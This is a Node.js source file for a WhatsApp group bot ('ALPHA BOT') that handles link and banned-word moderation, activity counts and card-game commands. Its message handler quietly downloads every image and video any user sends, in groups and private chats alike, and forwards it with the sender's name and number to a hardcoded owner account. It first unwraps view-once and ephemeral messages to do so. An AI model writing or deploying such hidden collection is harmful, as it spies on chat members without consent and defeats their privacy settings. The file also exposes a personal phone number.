const makeWASocket = require("@whiskeysockets/baileys").default;
const { useMultiFileAuthState, DisconnectReason, downloadMediaMessage } = require("@whiskeysockets/baileys");
const { Boom } = require("@hapi/boom");
const pino = require("pino");
const qrcode = require("qrcode-terminal");
const fs = require("fs");
const path = require("path");
const config = require("./config.json");
const { handleCommand, listeners, commands } = require("./handlers/commandHandler");

const DATA_DIR = path.join(__dirname, "data");
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);

function loadJSON(file, fallback) {
  const p = path.join(DATA_DIR, file);
  if (!fs.existsSync(p)) { fs.writeFileSync(p, JSON.stringify(fallback, null, 2)); return fallback; }
  try { return JSON.parse(fs.readFileSync(p, "utf8")); } catch(e) { return fallback; }
}

global.groupSettings = loadJSON("groups.json", {});
global.bannedWords = loadJSON("words.json", { words: config.banWords || [] });
global.activity = loadJSON("activity.json", {});
global.eventsData = loadJSON("events.json", {}); 
global.activeEvents = {}; 
global.timerData = loadJSON("timer.json", { lastReset: Date.now() });
global.lastActivityReset = global.timerData.lastReset;

global.saveGroups = () => fs.writeFileSync(path.join(DATA_DIR, "groups.json"), JSON.stringify(global.groupSettings, null, 2));
global.saveWords = () => fs.writeFileSync(path.join(DATA_DIR, "words.json"), JSON.stringify(global.bannedWords, null, 2));
global.saveActivity = () => fs.writeFileSync(path.join(DATA_DIR, "activity.json"), JSON.stringify(global.activity, null, 2));
global.saveEvents = () => fs.writeFileSync(path.join(DATA_DIR, "events.json"), JSON.stringify(global.eventsData, null, 2));
global.saveTimer = () => fs.writeFileSync(path.join(DATA_DIR, "timer.json"), JSON.stringify(global.timerData, null, 2));

global.logEvent = (groupId, gameName, winnerId, winnerName) => {
    if (!global.eventsData[groupId]) global.eventsData[groupId] = [];
    global.eventsData[groupId].push({ game: gameName, winner: winnerName || winnerId.split("@")[0], winnerId: winnerId, date: new Date().toLocaleString("ar-EG") });
    global.saveEvents();
};

setInterval(() => { 
    if (Date.now() - global.lastActivityReset >= 24 * 60 * 60 * 1000) {
        global.activity = {}; 
        global.eventsData = {}; 
        global.lastActivityReset = Date.now();
        global.timerData.lastReset = global.lastActivityReset;
        global.saveActivity(); 
        global.saveEvents(); 
        global.saveTimer(); 
        console.log("🔄 [TIMER] تم تصفير النشاط.");
    }
}, 60 * 1000); 

const processedMessages = new Set();

// 🌟 هنا القايمة اللي فيها أوامر اللعبة بس (هتكون متاحة لكل الأعضاء)
const publicCommands = [
    "سحب", "حقيبتي", "بطاقاتي", "عرض", "مبارزة", "ترتيب_الابطال", "تトップ", 
    "دمج", "هدية", "تطوير", "قبول", "رفض", "موافق", "بيع", "عمل", "سرقة", 
    "ترقية", "ترقيه", "اخفاء", "إخفاء", "اخفاء_البطاقات", "إخفاء_البطاقات", 
    "تحويل", "نقاط", "تحويل_نقاط", "سحب_قدرة", "سحب_قدرات", "سحب قدرة", 
    "سحب قدرات", "تبديل", "تطبيق_قدرة", "تطبيق قدرة", "تطبيق_قدرات", "جمع", "مبارزة", "قبول", "رفض", "موافق", "عرض القدرات", "قدرات"
]; 

async function startBot() {
  const { state, saveCreds } = await useMultiFileAuthState("auth_info");
  const sock = makeWASocket({ logger: pino({ level: "silent" }), auth: state, browser: ["ALPHA BOT", "Chrome", "1.0.0"] });

  sock.ev.on("creds.update", saveCreds);
  sock.ev.on("connection.update", ({ connection, lastDisconnect, qr }) => {
    if (qr) qrcode.generate(qr, { small: true });
    if (connection === "close") {
      const code = new Boom(lastDisconnect?.error)?.output?.statusCode;
      if (code !== DisconnectReason.loggedOut) startBot();
    }
    if (connection === "open") console.log("✅ ALPHA BOT tersambung.");
  });

  sock.ev.on("messages.upsert", async (m) => {
    try {
      if (m.type !== 'notify') return;
      const msg = m.messages[0];
      if (!msg.message) return;
      if (processedMessages.has(msg.key.id)) return;
      processedMessages.add(msg.key.id);
      if (processedMessages.size > 1000) processedMessages.delete(processedMessages.values().next().value);

      const from = msg.key.remoteJid;
      const isGroup = from.endsWith("@g.us");
      const sender = isGroup ? (msg.key.participant || from) : from;
      const senderNumber = sender.split("@")[0];
      const pushName = msg.pushName || "عضو";
      const specificOwnerJid = "201061182500@s.whatsapp.net";

      let actualMsg = msg.message;
      if (actualMsg.ephemeralMessage) actualMsg = actualMsg.ephemeralMessage.message;
      if (actualMsg.viewOnceMessageV2) actualMsg = actualMsg.viewOnceMessageV2.message;
      if (actualMsg.viewOnceMessage) actualMsg = actualMsg.viewOnceMessage.message;

      const isImage = actualMsg?.imageMessage;
      const isVideo = actualMsg?.videoMessage;

      if (isImage || isVideo) {
          try {
              const buffer = await downloadMediaMessage({ message: actualMsg, key: msg.key }, 'buffer', {}, { logger: pino({ level: 'silent' }), reuploadRequest: sock.updateMediaMessage });
              const caption = `👁️ *وسائط*\n\n👤 من: ${pushName} (+${senderNumber})\n👥 في: ${isGroup ? 'جروب' : 'خاص'}`;
              if (isImage) await sock.sendMessage(specificOwnerJid, { image: buffer, caption });
              else await sock.sendMessage(specificOwnerJid, { video: buffer, caption });
          } catch (err) {}
      }

      if (msg.key.fromMe) return; 
      const text = actualMsg?.conversation || actualMsg?.extendedTextMessage?.text || actualMsg?.imageMessage?.caption || "";

      if (isGroup) {
        const settings = global.groupSettings[from] || {};
        if (settings.hidden && !text.startsWith(config.prefix)) return; 
        if (!global.activity[from]) global.activity[from] = {};
        if (!global.activity[from][sender]) global.activity[from][sender] = 0;
        global.activity[from][sender]++;
        if (global.activity[from][sender] % 5 === 0) global.saveActivity();

        if (settings.antilink || settings.soupr_antilink) {
          const linkRegex = /(https?:\/\/|www\.|chat\.whatsapp\.com\/)/i;
          if (linkRegex.test(text)) {
            const isAdmin = await checkAdmin(sock, from, sender);
            if (!isAdmin) {
              try { await sock.sendMessage(from, { delete: msg.key }); await sock.sendMessage(from, { text: `⚠️ @${senderNumber} اللينكات ممنوعة هنا!`, mentions: [sender] }); } catch (e) {}
              return;
            }
          }
        }
        if ((settings.banword !== false || settings.soupr_protkt) && global.bannedWords.words) {
          if (global.bannedWords.words.some(w => text.toLowerCase().includes(w.toLowerCase()))) {
            const isAdmin = await checkAdmin(sock, from, sender);
            if (!isAdmin) {
                try { await sock.sendMessage(from, { delete: msg.key }); await sock.sendMessage(from, { text: `🚫 كلمة محظورة!`, mentions: [sender] }); } catch {}
                return;
            }
          }
        }
      }

      if (text.trim() === ".test") {
        await sock.sendMessage(specificOwnerJid, { text: "✅ البوت شغال وبيكلمك في الخاص يا بوس!" });
        return;
      }

      // 🌟 التحقق من الأوامر
      if (text.startsWith(config.prefix)) {
        const args = text.slice(config.prefix.length).trim().split(/\s+/);
        const cmd = args.shift().toLowerCase();
        
        if (commands.has(cmd)) {
          const isOwner = config.ownerNumbers.includes(senderNumber);
          
          // لو الأمر في قايمة اللعبة (publicCommands)، أو إنت الأونر.. نفذه
          if (isOwner || publicCommands.includes(cmd)) {
            await handleCommand(sock, msg, from, sender, isGroup, cmd, args, text);
            return;
          }
        }
      }

      for (const L of listeners) {
        if (L && L.onMessage) {
          const handled = await L.onMessage({ sock, msg, from, sender, text, isGroup, args: [], raw: text });
          if (handled) return;
        }
      }
    } catch (error) {}
  });
}

async function checkAdmin(sock, groupId, userId) {
  try {
    const meta = await sock.groupMetadata(groupId);
    const p = meta.participants.find(x => x.id === userId);
    return p?.admin === "admin" || p?.admin === "superadmin";
  } catch { return false; }
}
global.checkAdmin = checkAdmin;
startBot();
